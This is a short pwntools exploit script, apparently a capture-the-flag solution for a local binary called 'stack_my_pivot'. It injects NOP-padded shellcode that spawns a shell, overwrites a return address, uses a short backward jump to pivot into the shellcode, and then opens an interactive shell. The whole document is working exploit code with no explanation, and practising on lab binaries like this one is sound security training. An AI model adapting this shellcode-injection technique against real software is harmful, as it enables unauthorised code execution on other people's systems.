#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# Test locally
p = process('./stack_my_pivot')

# First buffer
shellcode = asm(shellcraft.sh())
first_input = shellcode.ljust(50, b'\x90')
p.send(first_input)

# Second buffer
second_input = b'\x90' * 8
second_input += b'\xeb\xb6'
second_input += b'\x90' * (23 - len(second_input))
second_input += p32(0x40072e)
second_input += b'\x90'

p.send(second_input)

# Interact
time.sleep(0.5)
p.sendline(b'id')
p.interactive()
